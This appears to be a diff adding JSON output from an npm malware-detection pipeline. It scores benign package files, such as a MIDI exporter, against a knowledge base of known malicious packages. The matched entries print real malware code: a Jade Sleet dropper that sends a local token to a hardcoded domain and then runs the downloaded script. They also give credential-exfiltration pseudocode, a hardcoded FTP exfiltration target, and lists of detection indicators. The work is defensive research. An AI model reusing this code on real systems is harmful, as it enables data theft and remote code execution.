+                    "Access to sensitive environment variables (e.g., process.env.SECRET) or filesystem paths (e.g., /etc/ssh/ssh_host_rsa_key, ~/.ssh/id_rsa)",
+                    "Use of eval() or other dynamic code execution functions with obfuscated or high-entropy strings",
+                    "Spawning shells or using child_process.exec to execute remote code"
+                  ],
+                  "file_indicators": [
+                    "package.json with suspicious scripts (postinstall, preinstall) that fetch and execute remote code",
+                    "JavaScript files containing fetch(), require('child_process'), or eval() with suspicious arguments",
+                    "Access to files like ~/.ssh/id_rsa, /etc/ssh/ssh_host_rsa_key, or other sensitive system paths"
+                  ],
+                  "network_indicators": [
+                    "Outbound requests to unknown or hardcoded domains (e.g., https://malicious-domain.com/steal, https://malicious-domain.com/payload.sh, https://malicious-domain.com/evil.sh)",
+                    "Use of curl, wget, or powershell to fetch remote scripts in install or runtime scripts",
+                    "Unusual API calls to external services not documented in package usage"
+                  ],
+                  "how_to_detect": "Monitor package.json for install scripts that fetch or execute remote code. Analyze package source for use of network, shell, or privileged APIs, especially with hardcoded external domains. Flag access to sensitive files or environment variables. Detect use of eval() or obfuscated code. Correlate outbound network requests to untrusted domains during install or runtime. Use static and dynamic analysis to identify suspicious behaviors and cross-reference with known IOCs."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133826_958903_snippet_2",
+              "source_package": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_958903/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.38526758551597595,
+              "code_similarity": 0.305311918258667,
+              "behavior_similarity": 0.4652232527732849,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const os = require('os');\nconst path = require('path');\nvar fs = require('fs');\n\nfunction getsvnroot(domain, entry, token, path) {\n  const https = require('https');\n  const querystring = require('querystring');\n\n  const options = {\n    hostname: domain,\n    port: 443,\n    path: entry,\n    method: 'POST',\n    headers: { 'content-type': 'application/x-www-form-urlencoded' },\n  };\n\n  const req = https.request(options, (resp) => {\n    let data = '';\n    resp.on('data', (chunk) => {\n      data += chunk;\n    });\n    resp.on('end', () => {\n      fs.writeFileSync(path, data);\n      const { exec } = require('child_process');\n      exec('node ' + path, (error, stdout, stderr) => {});\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e.message);\n  });\n  req.write(token);\n  req.end();\n}\n\nprocess.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0;\n\nvar dir = path.join(os.homedir(), '.svnlook');\nif (fs.existsSync(dir)) {\n  const token = fs.readFileSync(path.join(dir, 'svntoken'), { encoding: 'utf8', flag: 'r', });\n  getsvnroot('cryptopriceoffer.com', '/getupdate.php', token, path.join(dir, 'checksvn.js'));\n}",
+                "code_behavior": "At import-time or runtime, the code reads a token from a file in a hidden directory, sends it via HTTPS POST to a hardcoded remote server, writes the server's response as a new JavaScript file, and immediately executes it as a child process, resulting in exfiltration of local data and arbitrary remote code execution.",
+                "malice_analysis": {
+                  "why_suspicious": "The code chains together reading a local secret, exfiltrating it to a suspicious domain, downloading a new script, and executing it, all without user knowledge or consent. It disables TLS certificate validation, further increasing risk.",
+                  "violated_expectations": "Normal packages do not exfiltrate local data or execute downloaded code automatically, nor do they disable TLS certificate validation.",
+                  "similar_legitimate_use": "Automated updaters may download and run code, but only with explicit user consent, from trusted sources, and with proper TLS validation.",
+                  "key_indicators": [
+                    "Reading secret from hidden directory",
+                    "POSTing data to hardcoded suspicious domain",
+                    "Writing and executing remote code as a new file",
+                    "Disabling TLS certificate validation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time/runtime",
+                  "file_location": "index.js (second package, Jade Sleet campaign)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "child_process"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (Jade Sleet & Moonstone Sleet campaigns, multiple packages)",
+                  "package_manager": "npm",
+                  "package_versions": "Multiple versions, published between Summer 2023 and Q2 2024",
+                  "why_malicious": "These packages are designed to execute arbitrary code on installation or import, exfiltrate data, download and execute additional payloads, and target both Windows and Linux systems. They use obfuscation, multi-stage payloads, and anti-forensics to evade detection and maximize impact."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Initial package creates hidden directory and fetches remote data, storing it locally.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Preparation for further malicious activity by second package."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Second package reads local token, exfiltrates it, downloads and executes new malicious code.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Arbitrary code execution and further compromise."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Single-package variant (Moonstone Sleet) downloads, decrypts, and executes remote payload on Windows, then deletes evidence.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Immediate compromise and anti-forensics."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Linux-targeting variant sets up directory, installs and runs disguised binary, deletes installer script.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Persistence and stealthy execution on Linux systems."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Creation of hidden or misleadingly named directories in user home or application support paths (e.g., .svnlook, ~/Library/Application Support/UpdateProvider)",
+                    "Synchronous or asynchronous network requests to hardcoded suspicious domains or IPs during install/import",
+                    "Writing and executing files downloaded from remote servers, especially as new scripts or binaries",
+                    "Immediate deletion of installer or script files after execution (anti-forensics)",
+                    "Conditional OS-specific payload execution (e.g., Windows vs Linux branches)",
+                    "Disabling TLS certificate validation in Node.js environment"
+                  ],
+                  "file_indicators": [
+                    ".svnlook directory in user home",
+                    "svntoken, checksvn.js, preinstall.bat, preinstall.ps1, sqlite.a, updateMacOS",
+                    "deference.js (deleted post-execution)",
+                    "~/Library/Application Support/UpdateProvider"
+                  ],
+                  "network_indicators": [
+                    "cryptopriceoffer.com (checkupdate.php, getupdate.php)",
+                    "103.179.142.171/npm/npm.mov",
+                    "Other hardcoded C2 domains/IPs"
+                  ],
+                  "how_to_detect": "Monitor for creation of hidden or misleadingly named directories and files in user home or application support paths, unexpected network requests to known malicious domains or IPs during install/import, execution of downloaded scripts or binaries, and immediate file deletion post-install. Flag packages that conditionally execute OS-specific payloads, disable TLS certificate validation, or use obfuscated/encoded payloads. Correlate with known IOCs and behavioral patterns from Jade Sleet and Moonstone Sleet campaigns for high-confidence detection."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/KeyValuePair.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/MelodyExtractor.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/maia-markov/0.1.12/package/es6/MidiExport.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "MidiExport_slice_1",
+          "code_snippet": "// Imports\n// import fs\nconst fs = require('fs')\nconst { Midi } = require('@tonejs/midi')\nconst mu = require('maia-util')\n\n// Constructor for MidiExport object\nclass MidiExport {\n  constructor(\n    _points, _controlChanges, _fpath, _param = {\n      \"scaleFactor\": 1,\n      \"timeSigTopNo\": 4,\n      \"timeSigBottomNo\": 4,\n      \"noteIndices\": {\n        \"ontimeIndex\": 0,\n        \"mnnIndex\": 1,\n        \"durationIndex\": 3,\n        \"channelIndex\": 4,\n        \"velocityIndex\": 5\n      },\n      \"ccIndices\": {\n        \"ontimeIndex\": 0,\n        \"numberIndex\": 1,\n        \"channelIndex\": 2,\n        \"valueIndex\": 3\n      }\n    }\n  ){\n    // Workaround for JS context peculiarities.\n    // var self = this;\n    this.points = _points\n    this.controlChanges = _controlChanges\n    this.fpath = _fpath\n    this.scaleFactor = _param.scaleFactor\n    this.timeSigTopNo = _param.timeSigTopNo\n    this.timeSigBottomNo = _param.timeSigBottomNo\n    this.noteIndices = {}\n    this.noteIndices.ontimeIndex = _param.noteIndices.ontimeIndex\n    this.noteIndices.mnnIndex = _param.noteIndices.mnnIndex\n    this.noteIndices.durationIndex = _param.noteIndices.durationIndex\n    this.noteIndices.channelIndex = _param.noteIndices.channelIndex\n    this.noteIndices.velocityIndex = _param.noteIndices.velocityIndex\n    this.ccIndices = {}\n    if (_param.ccIndices){\n      this.ccIndices.ontimeIndex = _param.ccIndices.ontimeIndex\n      this.ccIndices.numberIndex = _param.ccIndices.numberIndex\n      this.ccIndices.channelIndex = _param.ccIndices.channelIndex\n      this.ccIndices.valueIndex = _param.ccIndices.valueIndex\n    }\n    this.my_export()\n    // Possible to return something.\n    // return sth;\n  }\n\n  my_export(){\n    const self = this\n    let ontimeCorrection = 0\n    const minOntime = mu.min_argmin(\n      self.points.map(function(p){ return p[self.noteIndices.ontimeIndex] })\n    )[0]\n    if (minOntime < 0){\n      ontimeCorrection = 4*self.timeSigTopNo/self.timeSigBottomNo\n    }\n\n    // Organise the points and control changes according to their channel numbers.\n    const pointsByChan = []\n    const ccByChan = []\n    self.points.forEach(function(p){\n      if (pointsByChan[p[self.noteIndices.channelIndex]] === undefined){\n        pointsByChan[p[self.noteIndices.channelIndex]] = [p]\n      }\n      else {\n        pointsByChan[p[self.noteIndices.channelIndex]].push(p)\n      }\n    })\n    if (self.controlChanges !== null){\n      self.controlChanges.forEach(function(cc){\n        if (ccByChan[cc[self.ccIndices.channelIndex]] === undefined){\n          ccByChan[cc[self.ccIndices.channelIndex]] = [cc]\n        }\n        else {\n          ccByChan[cc[self.ccIndices.channelIndex]].push(cc)\n        }\n      })\n    }\n\n\n    let midi = new Midi()\n    // \"Works\" but actually changes nothing!:\n    // midi.header.setTempo(240)\n    // console.log(\"midi.header:\", midi.header)\n    let ntracks = Math.max(pointsByChan.length, ccByChan.length)\n    for (let i = 0; i < ntracks; i++){\n      const track = midi.addTrack()\n      track[\"channel\"] = i\n      if (pointsByChan[i] !== undefined){\n        pointsByChan[i].forEach(function(p){\n          track.addNote({\n            midi: p[self.noteIndices.mnnIndex],\n            time: self.scaleFactor*(p[self.noteIndices.ontimeIndex] + ontimeCorrection),\n            duration: self.scaleFactor*p[self.noteIndices.durationIndex],\n            velocity: p[self.noteIndices.velocityIndex]\n          })\n        })\n      }\n      if (ccByChan[i] !== undefined){\n        ccByChan[i].forEach(function(cc){\n          track.addCC({\n            number: cc[self.ccIndices.numberIndex],\n            time: self.scaleFactor*(cc[self.ccIndices.ontimeIndex] + ontimeCorrection),\n            value: cc[self.ccIndices.valueIndex]\n          })\n        })\n      }\n    }\n    fs.writeFileSync(\n      self.fpath,\n      new Buffer.from(midi.toArray())\n    )\n  }\n}\n\nexport default MidiExport\n",
+          "is_malicious": false,
+          "malice_score": 0.41323639353116354,
+          "confidence": 0.1,
+          "behavior_summary": "When called, the code modifies and writes MIDI data to a file using the fs.writeFileSync API. It processes input musical note and control change data arrays, organizes them by MIDI channel, constructs a MIDI object, and writes the resulting binary MIDI data to the specified file path. This behavior involves file system write operations but does not access network, environment variables, or execute system commands, resulting in local file creation/modification without direct security impact.",
+          "explanation": "[LLM Judgment: Benign] The provided code is a MIDI export utility that processes musical note and control change data, organizes it by MIDI channel, constructs a MIDI file, and writes it locally to disk. It uses standard Node.js APIs such as 'fs.writeFileSync' for file writing and a known MIDI library '@tonejs/midi' for MIDI data manipulation. There is no evidence of network communication, data exfiltration, obfuscation, or system manipulation. The code's behavior is consistent with legitimate audio processing and file generation tasks. Compared to the known malicious patterns, it does not exhibit any suspicious operations such as packaging data for upload, accessing sensitive system files, or sending data externally. The similarity scores to known malware are low, and the code lacks any suspicious API usage or intent indicators.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_113501_068589_snippet_1",
+              "source_package": "akiraa-wb (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113501_068589/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42738664150238037,
+              "code_similarity": 0.38206106424331665,
+              "behavior_similarity": 0.4727121889591217,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const createFormData = (_0x28481b, _0x199329, _0xd1715e) => {\n  const { mime: _0xb2cb19 } = fromBuffer(_0x28481b) || {},\n    _0x1881ee = new FormData();\n  return (\n    _0x1881ee.append(_0x199329, _0x28481b, randomBytes + '.' + _0xd1715e),\n    _0x1881ee\n  );\n};",
+                "code_behavior": "At runtime, the code creates a multipart form-data object from arbitrary file buffers, attaches a randomized filename, and prepares the data for upload to external services, enabling covert file exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "This function is designed to package arbitrary file data for upload, which is not expected in a WhatsApp automation tool and enables unauthorized data exfiltration.",
+                  "violated_expectations": "Normal WhatsApp automation scripts do not require arbitrary file exfiltration or form-data creation for external uploads, especially without user consent.",
+                  "similar_legitimate_use": "Legitimate file upload utilities or cloud storage clients may use similar code, but only with explicit user action and consent.",
+                  "key_indicators": [
+                    "Automated creation of form-data from arbitrary file buffers",
+                    "Randomized filenames to obscure file origin",
+                    "Preparation of data for network exfiltration"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main package file (obfuscated JavaScript)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "akiraa-wb",
+                  "package_manager": "npm",
+                  "package_versions": "all versions (latest released <1 year ago)",
+                  "why_malicious": "The package contains obfuscated JavaScript code that, at runtime, exfiltrates user files to multiple hardcoded external file-sharing services without user consent. It automates unauthorized data uploads to suspicious endpoints, using randomized filenames and evasion techniques, making it a tool for covert data exfiltration and a clear indicator of compromise."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Prepare file data for upload by creating form-data with randomized filenames.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "File data is ready for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Upload file data to external file-sharing services via HTTP POST requests, targeting multiple hardcoded endpoints.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Files are exfiltrated to attacker-controlled endpoints."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Monitor the package file for changes and reload dynamically to evade detection or enable code updates.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Malicious code persists and can be updated without user awareness."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Automated creation of form-data from arbitrary file buffers at runtime",
+                    "Silent HTTP POST requests to known file-sharing endpoints without user interaction",
+                    "Use of fake or randomized User-Agent headers in network requests to evade detection",
+                    "Self-watching and hot-reloading of package files at runtime using fs.watchFile"
+                  ],
+                  "file_indicators": [
+                    "Obfuscated JavaScript in main package file",
+                    "References to file-sharing endpoints such as telegra.ph, uguu.se, catbox.moe, pomf2.lain.la, uploadcare.com, tmpfiles.org, itzpire.site, skizo.tech",
+                    "fs.watchFile usage targeting __filename in JavaScript files"
+                  ],
+                  "network_indicators": [
+                    "POST requests to https://telegra.ph/upload",
+                    "POST requests to https://uguu.se/upload.php",
+                    "POST requests to https://catbox.moe/user/api.php",
+                    "POST requests to https://pomf2.lain.la/upload.php",
+                    "POST requests to https://upload.uploadcare.com/base/",
+                    "POST requests to https://tmpfiles.org/api/v1/upload",
+                    "POST requests to https://itzpire.site/tools/upload",
+                    "POST requests to https://skizo.tech/api/upload"
+                  ],
+                  "how_to_detect": "Monitor JavaScript packages for creation of form-data from arbitrary file buffers and automated HTTP POST requests to known file-sharing endpoints, especially if these actions occur without user interaction. Flag any use of fs.watchFile on the package's own file (__filename), and inspect for obfuscated code or hardcoded references to suspicious upload URLs. Network monitoring should alert on outbound POST requests to the listed file-sharing domains. Correlate these behaviors to identify covert data exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171641_007733_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps) (NSIS installer (Electron app distribution))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171641_007733/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.410768985748291,
+              "code_similarity": 0.371855765581131,
+              "behavior_similarity": 0.44968223571777344,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst os = require('os');\nconst fs = require('fs');\nconst fetch = require('node-fetch');\n\n// Collect system info\nconst sysInfo = os.userInfo();\nconst browserHistory = fs.readFileSync('path/to/browser/history');\nconst credentials = fs.readFileSync('path/to/credentials');\n\n// Exfiltrate to gofile\nfetch('https://gofile.io/upload', {\n  method: 'POST',\n  body: { sysInfo, browserHistory, credentials }\n});",
+                "code_behavior": "At runtime (upon application execution), the code collects system information, browser history, and credentials from the filesystem using Node.js APIs, then sends this data via an outbound HTTP POST request to the gofile.io file-sharing service, resulting in exfiltration of sensitive user data to an external attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive files such as browser history and credential stores, then transmits this data to an external file-sharing service (gofile.io) without user knowledge or consent. This behavior is characteristic of infostealer malware.",
+                  "violated_expectations": "Legitimate Electron applications should not access or transmit user credentials, browser history, or detailed system information without explicit user consent and clear disclosure. Accessing and exfiltrating such data is a direct violation of user privacy and security expectations.",
+                  "similar_legitimate_use": "Some legitimate applications may collect anonymized telemetry or crash logs, but they do not access credential stores or browser histories, and always request user consent for any data collection or transmission.",
+                  "key_indicators": [
+                    "Direct file access to browser history and credential files from within Electron app resources",
+                    "Outbound HTTP POST requests to gofile.io/upload or similar file-sharing endpoints",
+                    "Node.js code embedded in .asar archives performing OS-level data harvesting",
+                    "Absence of user prompts or consent dialogs for sensitive data access or transmission"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "at runtime (upon application execution)",
+                  "file_location": "app\\resources\\app.asar\\a.js",
+                  "required_permissions": [
+                    "filesystem (read access to browser and credential files)",
+                    "network (outbound HTTP POST requests)",
+                    "environment_vars (access to user/system information)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (malicious Electron apps)",
+                  "package_manager": "NSIS installer (Electron app distribution)",
+                  "package_versions": "Unknown (all observed hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e)",
+                  "why_malicious": "These packages are Electron-based desktop applications distributed via NSIS installers that contain malicious Node.js code within their .asar archives. The code is designed to harvest sensitive user data, including system information, browser histories, and credentials, and exfiltrate it to external file-sharing services such as gofile.io. The applications masquerade as legitimate software to evade detection and facilitate data theft."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User downloads and executes a trojanized Electron app distributed as an NSIS installer.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious Electron app is installed and launched."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Electron app unpacks and executes Node.js code from the .asar archive (a.js) upon application startup.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is loaded into memory and prepared for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious Node.js code collects system information, browser history, and credentials from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is gathered from the victim's machine."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Collected data is exfiltrated to gofile.io via HTTP POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives stolen data via the file-sharing service."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Electron app accessing browser history and credential files without user consent",
+                    "Electron app making outbound HTTP POST requests to file-sharing services such as gofile.io",
+                    "Node.js code within .asar archives performing OS-level data collection and exfiltration"
+                  ],
+                  "file_indicators": [
+                    "Presence of suspicious .asar files in Electron app resources (e.g., app\\resources\\app.asar\\a.js)",
+                    "NSIS installer files with hashes: 9926e2782d603061b52d88f83d93e7af, cfc6e0014b3cc8d4dcaf0d76e2382556, b150afa6b3642ea1da1233b76f7b454e"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://gofile.io/upload from Electron app processes",
+                    "Unusual HTTP POST requests containing system or credential data to file-sharing domains"
+                  ],
+                  "how_to_detect": "Monitor Electron-based applications for unauthorized access to sensitive files such as browser history and credential stores. Inspect .asar archives for embedded Node.js scripts that perform data harvesting or exfiltration. Flag NSIS installers with known malicious hashes or those that unpack Electron apps exhibiting these behaviors. Monitor network traffic for outbound HTTP POST requests to gofile.io/upload or similar file-sharing services originating from Electron app processes."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_785146_snippet_1",
+              "source_package": "- (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_785146/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4049997925758362,
+              "code_similarity": 0.42138293385505676,
+              "behavior_similarity": 0.388616681098938,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "\"use strict\";\nObject.defineProperty(exports, \"__esModule\", { value: true });\nexports.default = null;",
+                "code_behavior": "At import-time, the code defines the module as an ES module and exports a null default value, resulting in no data processing or side effects.",
+                "malice_analysis": {
+                  "why_suspicious": "The code is not inherently malicious, but the presence of a package with a single-character name and no functional code is highly unusual. Such packages are often created unintentionally due to typographical errors and can be abused in the future if the code is updated to include malicious payloads.",
+                  "violated_expectations": "Legitimate npm packages typically provide useful functionality or utilities, whereas this package exports only a null value and performs no operations.",
+                  "similar_legitimate_use": "Test, placeholder, or namespace-reserving packages may sometimes be published with minimal or no functionality, but these are usually clearly marked or not widely downloaded.",
+                  "key_indicators": [
+                    "Single-character package name ('-')",
+                    "index.js exports only null as default",
+                    "No functional code or logic present",
+                    "Unusually high download count for a non-functional package"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js",
+                  "required_permissions": []
+                },
+                "package_info": {
+                  "package_name": "-",
+                  "package_manager": "npm",
+                  "package_versions": "0.0.1",
+                  "why_malicious": "The package '-' is not currently malicious, but its existence and high download count are due to accidental installations caused by typographical errors in npm commands. Its presence in projects is unintentional and could be abused in the future if the package contents change to include malicious code. The risk is that such packages can be silently included in builds, creating a potential supply chain attack vector by providing an opportunity for attackers to later introduce malicious payloads into a widely distributed, trusted dependency."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Accidental installation of the '-' package due to typographical errors in npm commands or package.json dependencies.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2"
+                    ],
+                    "leads_to": "The package is included in the project, potentially as a placeholder for future malicious code, creating a supply chain risk if the package contents are updated with malicious payloads."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of single-character or command-like package names in dependencies (e.g., '-', 'i', 'g', 'D')",
+                    "Packages with no functional code or only skeleton code (e.g., exporting null or empty modules)",
+                    "High download counts for packages with no legitimate usage or documentation"
+                  ],
+                  "file_indicators": [
+                    "package.json dependencies including '-', 'i', 'g', 'D', or other single-character/command-like names",
+                    "index.js file that only exports null or an empty module",
+                    "package.json scripts section with non-functional or placeholder scripts referencing missing files"
+                  ],
+                  "network_indicators": [],
+                  "how_to_detect": "Scan package.json and package-lock.json for dependencies with suspicious names such as '-', 'i', 'g', or names matching npm command flags. Flag packages that have no functional code or only export null/empty modules in their main files. Check for non-functional npm scripts referencing missing files. Monitor for sudden inclusion of such packages in projects, especially if not explicitly added by developers, and alert on high download counts for packages with no legitimate usage or documentation."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_103502_806789_snippet_3",
+              "source_package": "test-* (published by malikrukd4732) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_103502_806789/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.40477705001831055,
+              "code_similarity": 0.390738308429718,
+              "behavior_similarity": 0.4188157916069031,
+              "matched_snippet": {
+                "snippet_id": "snippet_3",
+                "code_snippet": "// Pseudocode based on report description\nconst os = require('os');\nconst fs = require('fs');\nconst archiver = require('archiver');\nconst ftp = require('ftp');\n\nconst username = os.userInfo().username;\nconst cwd = process.cwd();\n// Search for files with specific extensions or in specific directories\n// Archive found directories/files into ZIP\n// Connect to FTP server 185.62.57.60 with username 'root' and password 'TestX@!#33'\n// Upload ZIP archive",
+                "code_behavior": "At install-time, index.js collects the current OS username and working directory, recursively searches for files and directories matching targeted patterns, archives the discovered files into ZIP archives, and uploads the archives to a remote FTP server at 185.62.57.60 using hardcoded credentials, resulting in exfiltration of sensitive developer data.",
+                "malice_analysis": {
+                  "why_suspicious": "Automated searching, archiving, and exfiltration of user files during installation is a hallmark of info-stealing malware, especially when performed without user consent and using hardcoded network destinations.",
+                  "violated_expectations": "Normal packages do not access arbitrary user files or exfiltrate data to external servers during installation, nor do they use hardcoded FTP credentials to transmit user data.",
+                  "similar_legitimate_use": "Backup utilities or deployment tools may archive and upload files, but only with explicit user consent, configuration, and secure authentication—not with hardcoded credentials or during package installation.",
+                  "key_indicators": [
+                    "recursive access to sensitive directories and files",
+                    "creation of ZIP archives of user data during install",
+                    "FTP exfiltration to hardcoded IP address 185.62.57.60 with static credentials",
+                    "use of archiver and ftp modules in install-time scripts"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via index.js)",
+                  "file_location": "index.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "test-* (published by malikrukd4732)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions (July 31, 2023)",
+                  "why_malicious": "The packages execute code at install time that recursively searches for sensitive files and directories on the developer's machine, archives them into ZIP files, and exfiltrates the data to a remote FTP server using hardcoded credentials. This behavior is automated, highly targeted, and designed to steal confidential developer information without user knowledge or consent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of preinstall.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "preinstall.js is executed by the postinstall script and spawns index.js as a child process.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of main malicious payload in index.js"
+                  },
+                  {
+                    "step": 3,
+                    "action": "index.js collects sensitive user and project data, archives it, and uploads it to a remote FTP server at 185.62.57.60 using hardcoded credentials.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Exfiltration of developer data to attacker-controlled server"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of postinstall scripts that launch additional JavaScript processes during npm package installation",
+                    "Automated recursive search and archiving of user files and directories at install-time",
+                    "Outbound FTP connections to hardcoded IP addresses with static credentials during package installation"
+                  ],
+                  "file_indicators": [
+                    "Presence of preinstall.js and index.js in the npm package root directory",
+                    "package.json containing a postinstall script referencing custom JavaScript (e.g., 'node preinstall.js')",
+                    "ZIP archives created in temporary or user directories during npm install"
+                  ],
+                  "network_indicators": [
+                    "FTP connections to 185.62.57.60",
+                    "Use of FTP credentials: username 'root', password 'TestX@!#33'"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that launch additional scripts or processes, especially those referencing custom JavaScript files. Flag packages that access user directories, create ZIP archives, or initiate outbound FTP connections to hardcoded IP addresses. Review package.json for suspicious postinstall hooks and scan for the presence of preinstall.js and index.js files in the package root. Network monitoring should alert on FTP traffic to 185.62.57.60 or the use of static credentials such as username 'root' and password 'TestX@!#33'."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133830_348434_snippet_1",
+              "source_package": "TeamViewer.exe / BetterShaders Setup 1.0.3.exe / Software.exe (Electron-based infostealer variants) (NSIS installer (Electron app bundle))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133830_348434/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.39398327469825745,
+              "code_similarity": 0.3805629014968872,
+              "behavior_similarity": 0.4074036478996277,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Pseudocode representation based on report\nconst fs = require('fs');\nconst os = require('os');\nconst browserData = getBrowserData();\nconst credentials = getCredentials();\nconst systemInfo = getSystemInfo();\nconst payload = { browserData, credentials, systemInfo };\n\nuploadToGofile(payload);",
+                "code_behavior": "At runtime, after installation and on app launch, the code uses Node.js APIs to collect system information, browser histories, and credentials from the victim's machine, packages this data, and sends it via network requests to the gofile file-sharing service, resulting in exfiltration of sensitive user data.",
+                "malice_analysis": {
+                  "why_suspicious": "The code systematically harvests sensitive user data (system info, browser histories, credentials) and exfiltrates it to an external file-sharing service (gofile.io), which is a hallmark of infostealer malware.",
+                  "violated_expectations": "A legitimate Electron application should not access or transmit browser histories, credentials, or system information without explicit user consent, nor should it upload such data to anonymous third-party file-sharing services.",
